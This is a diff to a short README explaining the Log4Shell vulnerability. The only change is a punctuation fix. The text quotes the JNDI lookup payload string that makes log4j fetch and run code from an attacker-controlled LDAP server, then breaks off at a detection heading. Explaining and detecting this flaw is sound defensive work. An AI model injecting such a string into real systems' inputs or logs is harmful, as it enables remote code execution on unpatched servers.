@@ -1,7 +1,7 @@
 # Log4Shell Zero-Day Exploit
 
 if attacker manage to log this string `${jndi:ldap://someaddresshere/param1=value1}`
-to log4j it somehow loads the class/java bytecode sent by Attacker Controlled LDAP Server the bytecode could be used to
+to log4j it somehow loads the class/java bytecode sent by Attacker Controlled LDAP Server. The bytecode could be used to
 execute any malicious code or do some little trolling.
 
 ## Detection
